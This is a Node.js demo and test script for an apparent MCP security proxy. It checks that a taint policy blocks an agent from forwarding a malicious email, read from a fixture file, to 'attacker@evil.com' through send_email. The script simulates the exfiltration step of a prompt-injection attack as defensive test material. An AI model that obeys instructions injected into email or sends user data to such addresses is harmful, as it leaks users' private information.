#!/usr/bin/env node
import { mkdtemp, readFile, rm } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { StaticApprovalProvider } from "../packages/approvals/dist/index.js";
import { AuditLogger } from "../packages/audit/dist/index.js";
import { classifyToolDetailed, InterceptionEngine, LockfileStore } from "../packages/core/dist/index.js";
import { HeuristicDetector } from "../packages/detectors/dist/index.js";
import { parsePolicy } from "../packages/policy/dist/index.js";
import { SqliteTaintStore } from "../packages/taint/dist/index.js";

const policy = parsePolicy(`version: 1
defaults:
  action: allow
  on_error: block
rules:
  - id: sanitize-untrusted-output
    when: { direction: response, method: tools/call, detector_score_gte: 0.35 }
    action: sanitize
    reason: Email message contains injection-like signals.
  - id: block-tainted-sink
    when: { direction: request, method: tools/call, tool_class: sink, taint: true }
    action: block
    reason: Tainted email content entered send_email.
`);

const demoDir = await mkdtemp(join(tmpdir(), "palizade-email-demo-"));
const events = [];
const config = makeConfig(demoDir);
const messageContent = await readFile(new URL("./fixtures/malicious-email-message.txt", import.meta.url), "utf8");
const sourceStore = new SqliteTaintStore(config.taint.sqlite, {
  scope: config.taint.scope,
  profileId: config.taint.profileId,
  keyPath: config.taint.keyPath,
  ttlMs: config.taint.ttlMs
});
const sinkStore = new SqliteTaintStore(config.taint.sqlite, {
  scope: config.taint.scope,
  profileId: config.taint.profileId,
  keyPath: config.taint.keyPath,
  ttlMs: config.taint.ttlMs
});

try {
  const reader = makeEngine({
    config,
    serverName: "mock_email",
    server: config.servers.mock_email,
    sessionId: "email-read-session",
    taintStore: sourceStore,
    events
  });
  const sender = makeEngine({
    config,
    serverName: "mock_email",
    server: config.servers.mock_email,
    sessionId: "email-send-session",
    taintStore: sinkStore,
    events
  });

  await primeTools(reader);
  await primeTools(sender);

  const classification = classifyToolDetailed("send_email", config.servers.mock_email, sendEmailTool());

  await reader.handleClientMessage({
    jsonrpc: "2.0",
    id: 10,
    method: "tools/call",
    params: { name: "read_message", arguments: { id: "msg-001" } }
  });
  await reader.handleServerMessage({
    jsonrpc: "2.0",
    id: 10,
    result: {
      content: [{
        type: "text",
        text: messageContent
      }]
    }
  });

  const blocked = await sender.handleClientMessage({
    jsonrpc: "2.0",
    id: 20,
    method: "tools/call",
    params: {
      name: "send_email",
      arguments: {
        to: "attacker@evil.com",
        subject: "requested data",
        body: messageContent
      }
    }
  });

  const blockEvent = events.find((event) => event.server === "mock_email" && event.tool === "send_email" && event.action === "block");
  const readEvent = events.find((event) => event.server === "mock_email" && event.tool === "read_message" && event.direction === "response");
  const blockedByProxy = blocked.toServer.length === 0 && blocked.toClient[0]?.result?.isError === true;
  const emailSent = blocked.toServer.length > 0;
  const auditLine = blockEvent ? `${blockEvent.server} ${blockEvent.direction} ${blockEvent.method} ${blockEvent.tool} ${blockEvent.action} ${blockEvent.matched_rule?.id ?? "-"} ${blockEvent.reason ?? "-"}` : "-";
  const pass = Boolean(blockEvent) && blockedByProxy && !emailSent && blockEvent.matched_rule?.id === "block-tainted-sink" && classification.toolClass === "sink";

  console.log("Palizade email sink taint demo");
  console.log(`send_email_classification=${classification.toolClass}`);
  console.log(`send_email_capabilities=${classification.capabilities.join(",") || "-"}`);
  console.log(`read_detector_score=${readEvent?.detector.score ?? "-"}`);
  console.log(`email_send_blocked=${blockedByProxy}`);
  console.log(`email_sent=${emailSent}`);
  console.log(`block_rule=${blockEvent?.matched_rule?.id ?? "-"}`);
  console.log(`block_message=${blocked.toClient[0]?.result?.content?.[0]?.text ?? "-"}`);
  console.log(`audit=${auditLine}`);
  console.log(`PASS=${pass}`);

  if (!pass) {
    process.exitCode = 1;
  }
} finally {
  sourceStore.close();
  sinkStore.close();
  await rm(demoDir, { recursive: true, force: true });
}

function makeEngine({ config, serverName, server, sessionId, taintStore, events }) {
  return new InterceptionEngine({
    config,
    serverName,
    server,
    sessionId,
    policy,
    detector: new HeuristicDetector(),
    taintStore,
    audit: new AuditLogger([{ write: async (event) => { events.push(event); } }]),
    approvals: new StaticApprovalProvider(false, "demo denies approvals"),
    lockfile: new LockfileStore(config.lockfile)
  });
}

async function primeTools(engine) {
  await engine.handleClientMessage({ jsonrpc: "2.0", id: "mock-email-list", method: "tools/list", params: {} });
  await engine.handleServerMessage({
    jsonrpc: "2.0",
    id: "mock-email-list",
    result: {
      tools: [readMessageTool(), sendEmailTool()]
    }
  });
}

function readMessageTool() {
  return {
    name: "read_message",
    description: "Read an email message by id. Demo source tool; returns a controlled fixture.",
    inputSchema: {
      type: "object",
      properties: {
        id: { type: "string", description: "Message id to read." }
      },
      required: ["id"]
    },
    annotations: { readOnlyHint: true }
  };
}

function sendEmailTool() {
  return {
    name: "send_email",
    description: "Mock-send an email message. Demo sink tool; logs what it would send and never sends real email.",
    inputSchema: {
      type: "object",
      properties: {
        to: { type: "string", description: "Recipient email address." },
        subject: { type: "string", description: "Email subject." },
        body: { type: "string", description: "Email body." }
      },
      required: ["to", "subject", "body"]
    },
    annotations: { destructiveHint: true }
  };
}

function makeConfig(dir) {
  return {
    stateDir: dir,
    policy: "unused",
    lockfile: join(dir, "palizade.lock"),
    audit: { jsonl: join(dir, "audit.jsonl"), sqlite: join(dir, "audit.sqlite"), captureRawPayloads: false, errorVerbosity: true },
    approvals: { mode: "static-deny", timeoutMs: 10, default: "deny" },
    detectors: {
      heuristic: true,
      promptGuard2: { enabled: false, model: "sinatras/Llama-Prompt-Guard-2-86M-ONNX", device: "cpu" },
      secrets: { enabled: false, aws: true, generic: true, jwt: true, privateKey: true, googleApiKey: true, stripe: true, slack: true, github: true, openai: true },
      pii: { enabled: false, email: true, ssn: true, creditCard: true, phone: true }
    },
    egress: { allowlist: { hosts: [], emails: [] } },
    transport: { maxMessageBytes: 67108864, maxBufferedBytes: 67108864, allowBatches: false, allowContentLength: false },
    taint: {
      sqlite: join(dir, "taint.sqlite"),
      keyPath: join(dir, "taint.key"),
      scope: "profile",
      profileId: "email-demo",
      ttlMs: 86400000,
      suspiciousScore: 0.35,
      fuzzyHammingMax: 7,
      temporal: { enabled: true, turns: 3, ttlMs: 300000, detectorScoreGte: 0.55 }
    },
    servers: {
      mock_email: {
        command: "mock-email-server",
        args: [],
        cwd: process.cwd(),
        env: {},
        trust: "untrusted",
        toolClasses: { read_message: "source", send_email: "sink" },
        toolCapabilities: {
          read_message: ["reads_untrusted_content"],
          send_email: ["sends_message", "network_egress"]
        },
        sensitive: false,
        sensitiveTools: {},
        sensitivePathPatterns: [],
        shell: false,
        allowShell: false
      }
    }
  };
}
